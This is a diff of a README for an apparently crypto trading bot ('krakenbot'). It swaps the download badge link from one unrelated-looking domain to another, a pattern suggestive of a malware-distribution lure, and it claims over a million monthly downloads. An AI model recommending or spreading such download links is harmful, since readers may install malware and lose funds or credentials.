@@ -49,7 +49,7 @@ A: Yes — time-weighted average price execution for large orders.
 
 **Monthly downloads:** 1.2m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/krakenbot26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/krakenbot26)
 
 ---
 
